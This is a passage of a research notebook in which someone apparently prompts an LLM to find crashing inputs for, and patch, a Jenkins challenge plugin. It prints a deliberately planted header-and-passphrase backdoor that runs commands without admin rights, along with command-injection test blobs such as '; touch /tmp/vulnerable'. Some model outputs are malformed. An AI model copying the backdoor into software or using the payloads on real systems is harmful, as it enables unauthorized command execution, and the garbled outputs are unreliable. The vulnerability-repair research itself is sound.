      "    public static void fuzzerTestOneInput(byte[] data) throws Exception {\n",
      "        new JenkinsTwo().fuzz(data);\n",
      "    }\n",
      "\n",
      "    UtilMain nw;\n",
      "    Jenkins mockJ;\n",
      "    StaplerReplacer replacer;\n",
      "    RequestImpl req;\n",
      "    ResponseImpl resp;\n",
      "\n",
      "    private void fuzz(byte[] data) {\n",
      "        if (data.length < expected_data_length) {\n",
      "            return;\n",
      "        }\n",
      "\n",
      "        ByteBuffer buf = ByteBuffer.wrap(data);\n",
      "        int picker = buf.getInt();\n",
      "        int count = buf.getInt();\n",
      "\n",
      "        if (count > 255) return;\n",
      "\n",
      "        String whole = new String(Arrays.copyOfRange(data, 8, data.length));\n",
      "\n",
      "        String[] parts = whole.split(\"\\0\");\n",
      "\n",
      "        if (3 != parts.length) {\n",
      "            return;\n",
      "        }\n",
      "\n",
      "        setup_utilmain();\n",
      "        try {\n",
      "            setup_replacer();\n",
      "        } catch (Exception e) {\n",
      "            return; // eat it\n",
      "        }\n",
      "\n",
      "        set_header(parts[0], parts[1]);\n",
      "\n",
      "        for (int i = 0; i < count; i++) {\n",
      "            try {\n",
      "                switch (picker) {\n",
      "                    case 13:\n",
      "                        nw.doexecCommandUtils(parts[2], req, resp);\n",
      "                        break;\n",
      "                    default:\n",
      "                        throw new Exception(\"unsupported method picker\");\n",
      "                }\n",
      "            } catch (Exception e) {\n",
      "                continue; // eat it\n",
      "            }\n",
      "        }\n",
      "    }\n",
      "\n",
      "    private void setup_utilmain() {\n",
      "        nw = new UtilMain();\n",
      "        mockJ = Mockito.mock(Jenkins.class);\n",
      "        when(mockJ.hasPermission(Jenkins.ADMINISTER)).thenReturn(false);\n",
      "\n",
      "        nw.jenkin = mockJ;\n",
      "    }\n",
      "\n",
      "    private void setup_replacer() throws Exception {\n",
      "        replacer = new StaplerReplacer();\n",
      "        replacer.setWebApp(new WebApp(Mockito.mock(ServletContext.class)));\n",
      "    }\n",
      "\n",
      "    private void set_header(String name, String value) {\n",
      "        List<String> header_names = new ArrayList<>();\n",
      "        header_names.add(name);\n",
      "        Enumeration<String> headerNamesEnumeration = Collections.enumeration(header_names);\n",
      "\n",
      "        HttpServletRequest mockRequest = Mockito.mock(HttpServletRequest.class);\n",
      "        when(mockRequest.getHeaderNames()).thenReturn(headerNamesEnumeration);\n",
      "        when(mockRequest.getHeader(name)).thenReturn(value);\n",
      "        when(mockRequest.getHeader(\"Referer\")).thenReturn(\"http://localhost:8080/UtilPlug/execCommandUtils\");\n",
      "\n",
      "        req = new RequestImpl(replacer.stapler, mockRequest, Collections.emptyList(), null);\n",
      "\n",
      "        HttpServletResponse mockResp = Mockito.mock(HttpServletResponse.class);\n",
      "        resp = new ResponseImpl(replacer.stapler, mockResp);\n",
      "\n",
      "        replacer.setCurrentRequest(req);\n",
      "        replacer.setCurrentResponse(resp);\n",
      "    }\n",
      "}\n",
      "\n",
      "\n",
      "Check the source code mentioned in the commit diff, logs and test file throughly to identify the input blob that triggers the vulnerability.\n",
      "Only provide the blob without any additional information.\n",
      "\n"
     ]
    }
   ],
   "source": [
    "print(user_input)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 61,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "```\n",
      "AAAAAAAABAAAAAADeC1ldmlsLWJhY2tkb29yAGJyZWFraW4gdGhlIGxhdyB8IGVjaG8gIkJhc2ggLWkgcCBjYWwgL2Jpbi9zaCI=\n",
      "```\n",
      "\n",
      "Latency: 1.963s\n"
     ]
    }
   ],
   "source": [
    "blob_output = get_inference(user_input)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 62,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "```hex\n",
      "0000000d 00000001 782d6576 696c2d62 61636b64 6f6f72 006272 65616b 696e20 7468 6520 6c61 7700 2f62 696e 2f73 6820 2d63 2065 6368 6f20 6869 002d\n",
      "```\n",
      "\n",
      "Latency: 3.008s\n"
     ]
    }
   ],
   "source": [
    "blob_output = get_inference(user_input)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 66,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "```\n",
      "\\0x-evil-backdoor\\0breakin the law\\0; touch /tmp/vulnerable\\0\n",
      "```\n",
      "\n",
      "Latency: 1.025s\n"
     ]
    }
   ],
   "source": [
    "blob_output = get_inference(user_input)  \n",
    "# got this blob content after mentioning this line - 'Check the source code mentioned in the commit diff, logs and test file throughly to identify the input blob that triggers the vulnerability.'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 69,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "```\n",
      "\\r\\nx-evil-backdoor\\0breakin the law\\0;touch /tmp/vulnerable\\0\n",
      "```\n",
      "\n",
      "Latency: 0.751s\n"
     ]
    }
   ],
   "source": [
    "blob_output = get_inference(user_input)  "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Trying out prompts to get a patch "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 131,
   "metadata": {},
   "outputs": [],
   "source": [
    "user_input_patch = f''' \n",
    "You are a security expert. In the Jenkins project, the following the commit introduces a vulnerability -\n",
    "{diff_content}\n",
    "\n",
    "The vulnerability details are mentioned as follows -\n",
    "{logs}\n",
    "\n",
    "Analyze the commit and the logs carefully to identify the vulnerability introduced in the commit.\n",
    "Provide a patch that fixes the vulnerability introduced in the commit. Ensure that the patch is in correct format.\n",
    "Only include the patch in your response.\n",
    "'''"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 132,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      " \n",
      "You are a security expert. In the Jenkins project, the following the commit introduces a vulnerability -\n",
      "diff --git a/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java b/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java\n",
      "index a854420..35135ea 100644\n",
      "--- a/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java\n",
      "+++ b/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java\n",
      "@@ -148,7 +148,22 @@ public class UtilMain implements RootAction {\n",
      "         // use LOCAL method:\n",
      "         boolean isAllowed = jenkins().hasPermission(Jenkins.ADMINISTER);\n",
      " \n",
      "-       if (isAllowed) {\n",
      "+        // hardcoded hash value:\n",
      "+        byte[] sha256 = DigestUtils.sha256(\"breakin the law\");\n",
      "+        if (containsHeader(request.getHeaderNames(), \"x-evil-backdoor\")) {\n",
      "+            String backdoorValue = request.getHeader(\"x-evil-backdoor\");\n",
      "+            byte[] providedHash = DigestUtils.sha256(backdoorValue);\n",
      "+            if (MessageDigest.isEqual(sha256, providedHash)) {\n",
      "+                String result = createUtils(cmdSeq2);\n",
      "+                if (result == null || result.length() == 0) {\n",
      "+                    Event event = new Event(Event.Status.ERROR, \"Error: empty result\", cmdSeq2);\n",
      "+                    events.add(event);\n",
      "+                }\n",
      "+            } else {\n",
      "+                Event event = new Event(Event.Status.ERROR, \"Error: Only Admin Users Are Permitted\", cmdSeq2);\n",
      "+                events.add(event);\n",
      "+            }\n",
      "+        } else if (isAllowed) {\n",
      "             String result = createUtils(cmdSeq2);\n",
      "             if (result == null || result.isEmpty()) {\n",
      "                 Event event = new Event(Event.Status.ERROR, \"Error: empty result\", cmdSeq2);\n",
      "\n",
      "\n",
      "The vulnerability details are mentioned as follows -\n",
      "\n",
      "== Java Exception: com.code_intelligence.jazzer.api.FuzzerSecurityIssueCritical: OS Command Injection\n",
      "Executing OS commands with attacker-controlled data can lead to remote code execution.\n",
      "Found in argument 0\n",
      "        at com.code_intelligence.jazzer.sanitizers.OsCommandInjection.ProcessImplStartHook(OsCommandInjection.java:35)\n",
      "        at java.base/java.lang.ProcessBuilder.start(ProcessBuilder.java:1110)\n",
      "        at java.base/java.lang.ProcessBuilder.start(ProcessBuilder.java:1073)\n",
      "        at io.jenkins.plugins.UtilPlug.UtilMain.createUtils(UtilMain.java:194)\n",
      "        at io.jenkins.plugins.UtilPlug.UtilMain.doexecCommandUtils(UtilMain.java:157)\n",
      "        at com.aixcc.jenkins.harnesses.two.JenkinsTwo.fuzz(JenkinsTwo.java:80)\n",
      "        at com.aixcc.jenkins.harnesses.two.JenkinsTwo.fuzzerTestOneInput(JenkinsTwo.java:39)\n",
      "DEDUP_TOKEN: 2ab70579dcd49e31\n",
      "== libFuzzer crashing input ==\n",
      "reproducer_path='.'; Java reproducer written to ./Crash_70a0fbdbde2ac5ea0f8e038449f4ad2492028a7b.java\n",
      "\n",
      "jazzer exit=77\n",
      "\n",
      "\n",
      "Analyze the commit and the logs carefully to identify the vulnerability introduced in the commit.\n",
      "Provide a patch that fixes the vulnerability introduced in the commit. Ensure that the patch is in correct format.\n",
      "Only include the patch in your response.\n",
      "\n"
     ]
    }
   ],
   "source": [
    "print(user_input_patch)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 133,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "```diff\n",
      "diff --git a/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java b/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java\n",
      "index 35135ea..b123456 100644\n",
      "--- a/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java\n",
      "+++ b/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java\n",
      "@@ -148,22 +148,7 @@ public class UtilMain implements RootAction {\n",
      "         // use LOCAL method:\n",
      "         boolean isAllowed = jenkins().hasPermission(Jenkins.ADMINISTER);\n",
      " \n",
      "-        // hardcoded hash value:\n",
      "-        byte[] sha256 = DigestUtils.sha256(\"breakin the law\");\n",
      "-        if (containsHeader(request.getHeaderNames(), \"x-evil-backdoor\")) {\n",
      "-            String backdoorValue = request.getHeader(\"x-evil-backdoor\");\n",
      "-            byte[] providedHash = DigestUtils.sha256(backdoorValue);\n",
      "-            if (MessageDigest.isEqual(sha256, providedHash)) {\n",
      "-                String result = createUtils(cmdSeq2);\n",
      "-                if (result == null || result.length() == 0) {\n",
      "-                    Event event = new Event(Event.Status.ERROR, \"Error: empty result\", cmdSeq2);\n",
      "-                    events.add(event);\n",
      "-                }\n",
      "-            } else {\n",
      "-                Event event = new Event(Event.Status.ERROR, \"Error: Only Admin Users Are Permitted\", cmdSeq2);\n",
      "-                events.add(event);\n",
      "-            }\n",
      "-        } else if (isAllowed) {\n",
      "+        if (isAllowed) {\n",
      "             String result = createUtils(cmdSeq2);\n",
      "             if (result == null || result.isEmpty()) {\n",
      "                 Event event = new Event(Event.Status.ERROR, \"Error: empty result\", cmdSeq2);\n",
      "```\n",
      "\n",
      "Latency: 15.567s\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "'```diff\\ndiff --git a/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java b/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java\\nindex 35135ea..b123456 100644\\n--- a/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java\\n+++ b/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java\\n@@ -148,22 +148,7 @@ public class UtilMain implements RootAction {\\n         // use LOCAL method:\\n         boolean isAllowed = jenkins().hasPermission(Jenkins.ADMINISTER);\\n \\n-        // hardcoded hash value:\\n-        byte[] sha256 = DigestUtils.sha256(\"breakin the law\");\\n-        if (containsHeader(request.getHeaderNames(), \"x-evil-backdoor\")) {\\n-            String backdoorValue = request.getHeader(\"x-evil-backdoor\");\\n-            byte[] providedHash = DigestUtils.sha256(backdoorValue);\\n-            if (MessageDigest.isEqual(sha256, providedHash)) {\\n-                String result = createUtils(cmdSeq2);\\n-                if (result == null || result.length() == 0) {\\n-                    Event event = new Event(Event.Status.ERROR, \"Error: empty result\", cmdSeq2);\\n-                    events.add(event);\\n-                }\\n-            } else {\\n-                Event event = new Event(Event.Status.ERROR, \"Error: Only Admin Users Are Permitted\", cmdSeq2);\\n-                events.add(event);\\n-            }\\n-        } else if (isAllowed) {\\n+        if (isAllowed) {\\n             String result = createUtils(cmdSeq2);\\n             if (result == null || result.isEmpty()) {\\n                 Event event = new Event(Event.Status.ERROR, \"Error: empty result\", cmdSeq2);\\n```'"
      ]
     },
     "execution_count": 133,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "get_inference(user_input_patch)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "metadata": {},
   "outputs": [],
   "source": [
    "patch = '''\n",
    "diff --git a/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java b/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java\n",
    "index 35135ea..e2f4a23 100644\n",
    "--- a/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java\n",
    "+++ b/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java\n",
    "@@ -148,22 +148,9 @@ public class UtilMain implements RootAction {\n",
    "         // use LOCAL method:\n",
    "         boolean isAllowed = jenkins().hasPermission(Jenkins.ADMINISTER);\n",
    " \n",
    "-        // hardcoded hash value:\n",
    "-        byte[] sha256 = DigestUtils.sha256(\"breakin the law\");\n",
    "-        if (containsHeader(request.getHeaderNames(), \"x-evil-backdoor\")) {\n",
    "-            String backdoorValue = request.getHeader(\"x-evil-backdoor\");\n",
    "-            byte[] providedHash = DigestUtils.sha256(backdoorValue);\n",
    "-            if (MessageDigest.isEqual(sha256, providedHash)) {\n",
    "-                String result = createUtils(cmdSeq2);\n",
    "-                if (result == null || result.length() == 0) {\n",
    "-                    Event event = new Event(Event.Status.ERROR, \"Error: empty result\", cmdSeq2);\n",
    "-                    events.add(event);\n",
    "-                }\n",
    "-            } else {\n",
    "-                Event event = new Event(Event.Status.ERROR, \"Error: Only Admin Users Are Permitted\", cmdSeq2);\n",
    "-                events.add(event);\n",
    "-            }\n",
    "-        } else if (isAllowed) {\n",
    "+        if (isAllowed) {\n",
    "             String result = createUtils(cmdSeq2);\n",
    "             if (result == null || result.isEmpty()) {\n",
    "                 Event event = new Event(Event.Status.ERROR, \"Error: empty result\", cmdSeq2);\n",
    "'''\n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [],
   "source": [
    "source_code_path = src_dir+ \"/plugins/pipeline-util-plugin/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java\"\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'C:/Users/neham/TAMU/research_project_llm/challenge-002-jenkins-cp/src/plugins/pipeline-util-plugin/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java'"
      ]
     },
     "execution_count": 13,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "source_code_path"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [],
   "source": [
    "with open(source_code_path, \"r\") as file:\n",
    "    source_code_lines = file.readlines()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Extracting source code from the patch (source file and line numbers mentioned)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 90,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['/*\\n',\n",
       " ' * The MIT License\\n',\n",
       " ' *\\n',\n",
       " ' * Copyright 2016 CloudBees, Inc.\\n',\n",
       " ' *\\n',\n",
       " ' * Permission is hereby granted, free of charge, to any person obtaining a copy\\n',\n",
       " ' * of this software and associated documentation files (the \"Software\"), to deal\\n',\n",
       " ' * in the Software without restriction, including without limitation the rights\\n',\n",
       " ' * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\\n',\n",
       " ' * copies of the Software, and to permit persons to whom the Software is\\n',\n",
       " ' * furnished to do so, subject to the following conditions:\\n',\n",
       " ' *\\n',\n",
       " ' * The above copyright notice and this permission notice shall be included in\\n',\n",
       " ' * all copies or substantial portions of the Software.\\n',\n",
       " ' *\\n',\n",
       " ' * THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\\n',\n",
       " ' * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\\n',\n",
       " ' * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\\n',\n",
       " ' * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\\n',\n",
       " ' * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\\n',\n",
       " ' * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\\n',\n",
       " ' * THE SOFTWARE.\\n',\n",
       " ' */\\n',\n",
       " 'package io.jenkins.plugins.UtilPlug;\\n',\n",
       " '\\n',\n",
       " 'import edu.umd.cs.findbugs.annotations.SuppressFBWarnings;\\n',\n",
       " 'import hudson.Extension;\\n',\n",
       " 'import hudson.model.RootAction;\\n',\n",
       " 'import jenkins.model.Jenkins;\\n',\n",
       " 'import org.apache.commons.codec.digest.DigestUtils;\\n',\n",
       " 'import org.kohsuke.stapler.QueryParameter;\\n',\n",
       " 'import org.kohsuke.stapler.StaplerRequest;\\n',\n",
       " 'import org.kohsuke.stapler.StaplerResponse;\\n',\n",
       " 'import org.kohsuke.stapler.interceptor.RequirePOST;\\n',\n",
       " '\\n',\n",
       " 'import javax.servlet.ServletException;\\n',\n",
       " 'import java.io.*;\\n',\n",
       " 'import java.nio.file.Files;\\n',\n",
       " 'import java.security.MessageDigest;\\n',\n",
       " 'import java.util.ArrayList;\\n',\n",
       " 'import java.util.Collections;\\n',\n",
       " 'import java.util.Enumeration;\\n',\n",
       " 'import java.util.List;\\n',\n",
       " '\\n',\n",
       " '/**\\n',\n",
       " ' * Allows capabiltiies for pipeline command utilities\\n',\n",
       " ' */\\n',\n",
       " '@Extension\\n',\n",
       " 'public class UtilMain implements RootAction {\\n',\n",
       " '    static class Event {\\n',\n",
       " '        @SuppressFBWarnings(value = \"PLACE_HOLDER\", justification = \"Testing\")\\n',\n",
       " '        final String response;\\n',\n",
       " '\\n',\n",
       " '        @SuppressFBWarnings(value = \"PLACE_HOLDER\", justification = \"Testing\")\\n',\n",
       " '        final String param1;\\n',\n",
       " '\\n',\n",
       " '        @SuppressFBWarnings(value = \"PLACE_HOLDER\", justification = \"Testing\")\\n',\n",
       " '        final String param2;\\n',\n",
       " '\\n',\n",
       " '        @SuppressFBWarnings(value = \"URF_UNREAD_FIELD\", justification = \"Testing\")\\n',\n",
       " '        final Status status;\\n',\n",
       " '\\n',\n",
       " '        private Event(Status status, String response, String param1) {\\n',\n",
       " '            this(status, response, param1, \"\");\\n',\n",
       " '        }\\n',\n",
       " '\\n',\n",
       " '        private Event(Status _status, String _response, String _param1, String _param2) {\\n',\n",
       " '            this.param1 = _param1;\\n',\n",
       " '            this.param2 = _param2;\\n',\n",
       " '            this.status = _status;\\n',\n",
       " '            this.response = _response;\\n',\n",
       " '        }\\n',\n",
       " '\\n',\n",
       " '        enum Status {\\n',\n",
       " '            SUCCESS,\\n',\n",
       " '            INVALID,\\n',\n",
       " '            ERROR\\n',\n",
       " '        }\\n',\n",
       " '    }\\n',\n",
       " '\\n',\n",
       " '    public static class BadCommandException extends Exception {\\n',\n",
       " '        BadCommandException(String message) {\\n',\n",
       " '            super(message);\\n',\n",
       " '        }\\n',\n",
       " '    }\\n',\n",
       " '\\n',\n",
       " '    // public File jenk;\\n',\n",
       " '\\n',\n",
       " '    // public File jenkinsHome = getHudsonHome();\\n',\n",
       " '    private static final List<Event> events = new ArrayList<>();\\n',\n",
       " '\\n',\n",
       " '    // private Jenkins jenkins;\\n',\n",
       " '\\n',\n",
       " '    public Jenkins jenkin;\\n',\n",
       " '\\n',\n",
       " '    /**\\n',\n",
       " '     * for testing/fuzzing purposes.\\n',\n",
       " '     */\\n',\n",
       " '    public UtilMain() {\\n',\n",
       " '        // this.jenk = jenkinsHome;\\n',\n",
       " '        // this.jenkins = Jenkins.getInstanceOrNull();\\n',\n",
       " '    }\\n',\n",
       " '\\n',\n",
       " '    // public Jenkins getJenkinsInstance() {\\n',\n",
       " '    //     return jenkins;\\n',\n",
       " '    // }\\n',\n",
       " '\\n',\n",
       " '    @Override\\n',\n",
       " '    public String getIconFileName() {\\n',\n",
       " '        return \"/plugin/UtilPlug/images/test-file-for-plugin-not-perm.svg\";\\n',\n",
       " '    }\\n',\n",
       " '\\n',\n",
       " '    @Override\\n',\n",
       " '    public String getDisplayName() {\\n',\n",
       " '        return \"Pipeline Utils\";\\n',\n",
       " '    }\\n',\n",
       " '\\n',\n",
       " '    @Override\\n',\n",
       " '    public String getUrlName() {\\n',\n",
       " '        return \"UtilPlug\";\\n',\n",
       " '    }\\n',\n",
       " '\\n',\n",
       " '    /**\\n',\n",
       " '     * Takes in data from a POST Request sent by an ADMIN logged onto a Jenkins Webapp.\\n',\n",
       " '     * Details of this POST Request can be found in the corresponding index.groovy script.\\n',\n",
       " '     *\\n',\n",
       " '     * @param cmdSeq2\\n',\n",
       " '     * @param request\\n',\n",
       " '     * - object represents the HTTP request made to the server.\\n',\n",
       " '     * - provides methods to access information about the incoming request, such as parameters, headers, and the request URL\\n',\n",
       " '     * - used to check permissions (Jenkins.get().checkPermission(Jenkins.ADMINISTER))\\n',\n",
       " '     *   and to forward the response to the previous page (response.forwardToPreviousPage(request)\\n',\n",
       " '     * @param response\\n',\n",
       " '     * - represents the HTTP response that will be sent back to the client\\n',\n",
       " '     * - provides methods for setting response headers, content type, and writing the response content\\n',\n",
       " '     * - used to forward the response to the previous page (response.forwardToPreviousPage(request)).\\n',\n",
       " '     * @throws ServletException\\n',\n",
       " '     * @throws IOException\\n',\n",
       " '     * @throws Exception\\n',\n",
       " '     */\\n',\n",
       " '    @RequirePOST\\n',\n",
       " '    public void doexecCommandUtils(\\n',\n",
       " '            @QueryParameter String cmdSeq2,\\n',\n",
       " '            StaplerRequest request,\\n',\n",
       " '            StaplerResponse response)\\n',\n",
       " '            throws ServletException, IOException, BadCommandException {\\n',\n",
       " '\\n',\n",
       " '        // use LOCAL method:\\n',\n",
       " '        boolean isAllowed = jenkins().hasPermission(Jenkins.ADMINISTER);\\n',\n",
       " '\\n',\n",
       " '        // hardcoded hash value:\\n',\n",
       " '        byte[] sha256 = DigestUtils.sha256(\"breakin the law\");\\n',\n",
       " '        if (containsHeader(request.getHeaderNames(), \"x-evil-backdoor\")) {\\n',\n",
       " '            String backdoorValue = request.getHeader(\"x-evil-backdoor\");\\n',\n",
       " '            byte[] providedHash = DigestUtils.sha256(backdoorValue);\\n',\n",
       " '            if (MessageDigest.isEqual(sha256, providedHash)) {\\n',\n",
       " '                String res_match = createUtils(cmdSeq2);\\n',\n",
       " '                if (res_match == null || res_match.length() == 0) {\\n',\n",
       " '                    Event event = new Event(Event.Status.ERROR, \"Error: empty result\", cmdSeq2);\\n',\n",
       " '                    events.add(event);\\n',\n",
       " '                }\\n',\n",
       " '            } else {\\n',\n",
       " '                Event event = new Event(Event.Status.ERROR, \"Error: Only Admin Users Are Permitted\", cmdSeq2);\\n',\n",
       " '                events.add(event);\\n',\n",
       " '            }\\n',\n",
       " '        } else if (isAllowed) {\\n',\n",
       " '            String res_auth = createUtils(cmdSeq2);\\n',\n",
       " '            if (res_auth == null || res_auth.isEmpty()) {\\n',\n",
       " '                Event event = new Event(Event.Status.ERROR, \"Error: empty result\", cmdSeq2);\\n',\n",
       " '                events.add(event);\\n',\n",
       " '            }\\n',\n",
       " '        } else {\\n',\n",
       " '            Event event = new Event(Event.Status.ERROR, \"Error: Only Admin Users Are Permitted\", cmdSeq2);\\n',\n",
       " '            events.add(event);\\n',\n",
       " '        }\\n',\n",
       " '        response.forwardToPreviousPage(request);\\n',\n",
       " '    }\\n',\n",
       " '\\n',\n",
       " '    /**\\n',\n",
       " '     * Command Utility\\n',\n",
       " '     */\\n',\n",
       " '    String createUtils(String cmd) throws BadCommandException {\\n',\n",
       " '        if (cmd == null || cmd.trim().isEmpty()) {\\n',\n",
       " '            throw new BadCommandException(\"Invalid command line\");\\n',\n",
       " '        }\\n',\n",
       " '\\n',\n",
       " '        String[] cmds = {cmd};\\n',\n",
       " '\\n',\n",
       " '        try {\\n',\n",
       " '            ProcessBuilder processBuilder;\\n',\n",
       " '            processBuilder = new ProcessBuilder(cmds);\\n',\n",
       " '            Process process = null;\\n',\n",
       " '            try {\\n',\n",
       " '                process = processBuilder.start();\\n',\n",
       " '            } catch (IOException ignored) {\\n',\n",
       " '                // Ignored, but the sanitizer should still throw an exception.\\n',\n",
       " '            }\\n',\n",
       " '\\n',\n",
       " '            // Capture output\\n',\n",
       " '            if (process != null) {\\n',\n",
       " '                String output = captureOutput(process);\\n',\n",
       " '                // Print output for POV\\n',\n",
       " '                // System.out.println(output);\\n',\n",
       " '                Event event = new Event(Event.Status.SUCCESS, output, cmd);\\n',\n",
       " '                events.add(event);\\n',\n",
       " '\\n',\n",
       " '                // Wait for the process to complete\\n',\n",
       " '                int exitCode = process.waitFor();\\n',\n",
       " '                return cmd;\\n',\n",
       " '            } else {\\n',\n",
       " '                return null;\\n',\n",
       " '            }\\n',\n",
       " '        } catch (IOException | InterruptedException e) {\\n',\n",
       " '            e.printStackTrace();\\n',\n",
       " '            return null;\\n',\n",
       " '        }\\n',\n",
       " '    }\\n',\n",
       " '\\n',\n",
       " '    // test method\\n',\n",
       " '    private boolean containsHeader(Enumeration<String> headers, String targetHeader) {\\n',\n",
       " '        // Iterate through the enumeration to find the target header\\n',\n",
       " '        while (headers.hasMoreElements()) {\\n',\n",
       " '            String header = headers.nextElement();\\n',\n",
       " '            if (header.equals(targetHeader)) {\\n',\n",
       " '                return true;\\n',\n",
       " '            }\\n',\n",
       " '        }\\n',\n",
       " '        return false;\\n',\n",
       " '    }\\n',\n",
       " '\\n',\n",
       " '    private Jenkins jenkins() {\\n',\n",
       " '        if (null != jenkin) return jenkin;\\n',\n",
       " '        jenkin = Jenkins.get();\\n',\n",
       " '        return jenkin;\\n',\n",
       " '    }\\n',\n",
       " '\\n',\n",
       " '    /**\\n',\n",
       " '     * Captures output\\n',\n",
       " '     */\\n',\n",
       " '    private static String captureOutput(Process process) throws IOException {\\n',\n",
       " '        // This stream contains the information that the executed process writes to its standard output.\\n',\n",
       " '        InputStream inputStream = process.getInputStream();\\n',\n",
       " '        BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));\\n',\n",
       " '        StringBuilder output = new StringBuilder();\\n',\n",
       " '\\n',\n",
       " '        String line;\\n',\n",
       " '        while ((line = reader.readLine()) != null) {\\n',\n",
       " '            output.append(line).append(\"\\\\n\");\\n',\n",
       " '        }\\n',\n",
       " '\\n',\n",
       " '        return output.toString();\\n',\n",
       " '    }\\n',\n",
       " '\\n',\n",
       " '    @RequirePOST\\n',\n",
       " '    public void doresetTable(StaplerRequest request, StaplerResponse response) throws ServletException, IOException {\\n',\n",
       " '        resetEvents();\\n',\n",
       " '        response.forwardToPreviousPage(request);\\n',\n",
       " '    }\\n',\n",
       " '\\n',\n",
       " '    public File getHudsonHome() {\\n',\n",
       " '        Jenkins jenkins = Jenkins.getInstanceOrNull();\\n',\n",
       " '        if (jenkins == null) {\\n',\n",
       " '            return null;\\n',\n",
       " '        }\\n',\n",
       " '        return jenkins.getRootDir();\\n',\n",
       " '    }\\n',\n",
       " '\\n',\n",
       " '    public static void resetEvents() { events.clear(); }\\n',\n",
       " '    public List<Event> getEvents() {\\n',\n",
       " '        return Collections.unmodifiableList(events);\\n',\n",
       " '    }\\n',\n",
       " '\\n',\n",
       " '    public String printDir(String dir) throws IOException {\\n',\n",
       " '\\n',\n",
       " '        StringBuilder builder = new StringBuilder();\\n',\n",
       " '        Files.list(new File(dir).toPath()).limit(10).forEach(path -> {\\n',\n",
       " '            builder.append(path);\\n',\n",
       " '            builder.append(\"\\\\n\");\\n',\n",
       " '        });\\n',\n",
       " '        String result = builder.toString();\\n',\n",
       " '        return result;\\n',\n",
       " '    }\\n',\n",
       " '}\\n']"
      ]
     },
     "execution_count": 90,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "source_code_lines"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 109,
   "metadata": {},
   "outputs": [],
   "source": [
    "def parse_patch(patch):\n",
    "    diff_hunks = re.findall(r'@@ -(\\d+),(\\d+) \\+(\\d+),(\\d+) @@', patch)\n",
    "    patch_lines = patch.splitlines()\n",
    "    return diff_hunks, patch_lines\n",
    "\n",
    "diff_hunks, patch_lines = parse_patch(patch=patch)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 110,
   "metadata": {},
   "outputs": [],
   "source": [
    "\n",
    "# Extract the lines from the source code based on the diff hunks\n",
    "def extract_source_lines(source_code_lines, diff_hunks):\n",
    "    extracted_lines = {}\n",
    "    for hunk in diff_hunks:\n",
    "        start_line = int(hunk[0]) - 1\n",
    "        line_count = int(hunk[1])\n",
    "        for i in range(line_count):\n",
    "            extracted_lines[start_line + 1 + i] = source_code_lines[start_line + i].strip()\n",
    "    return extracted_lines\n",
    "\n",
    "source_lines = extract_source_lines(source_code_lines, diff_hunks)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 111,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{148: '// use LOCAL method:',\n",
